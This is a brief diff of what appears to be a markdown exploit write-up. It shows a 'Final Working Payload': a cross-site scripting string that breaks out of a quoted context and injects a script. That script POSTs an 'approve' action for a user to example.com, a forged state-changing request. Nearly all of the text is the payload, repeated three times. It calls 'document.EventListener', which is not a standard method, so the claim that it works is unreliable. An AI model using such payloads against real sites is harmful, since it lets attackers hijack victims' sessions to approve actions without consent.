@@ -396,7 +396,7 @@ https://example.com/"-document.EventListener('DOMContentLoaded', function() {doc
 
 Final Working Payload
 
-https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
+`https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"`
 ```
 https://example.com/"-document.EventListener('DOMContentLoaded', function() {document.body.appendChild(Object.assign(document.createElement('script'), { textContent: "fetch('https://example.com/approve',{method:'POST',body:'user=test&action=approve'}).then(console.log())"}))})-"
 ```
